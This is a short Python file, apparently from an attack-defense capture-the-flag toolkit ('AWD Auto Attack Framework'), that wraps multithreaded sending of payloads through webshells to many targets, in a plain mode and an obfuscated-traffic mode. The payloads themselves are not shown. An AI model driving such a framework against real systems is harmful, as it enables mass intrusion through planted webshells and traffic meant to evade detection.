#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import re
import base64

from common import logger, rsa_encrypt, rsa_decrypt, callback_default
from config import FLAG_PATTERN
from mix import NormalRequest, MixRequest

from payloads import *


def attack_by_normal_request(targets, shell, passwd, payload, threads=10, callback=None):
    """普通攻击封装
    """
    logger.info("[+] Init Normal Request...")
    if not passwd and not isinstance(payload, dict):
        req = NormalRequest(shell, passwd, payload, targets)
    else:
        req = NormalRequest(shell, passwd, payload, targets)
    if not callback:
        req.callback.append(callback_default)
    else:
        req.callback.append(callback)
    req.start(threads)


def attack_by_mix_request(targets, shell, passwd, payload, threads=10, callback=None):
    """混淆流量攻击封装
    """
    logger.info("[+] Init Mix Request...")
    if not passwd and not isinstance(payload, dict):
        req = MixRequest(shell, passwd, payload, targets)
    else:
        req = MixRequest(shell, passwd, payload, targets)
    if not callback:
        req.callback.append(callback_default)
    else:
        req.callback.append(callback)
    req.start(threads)


if __name__ == '__main__':
    logger.info("[+] AWD Auto Attack Framework")
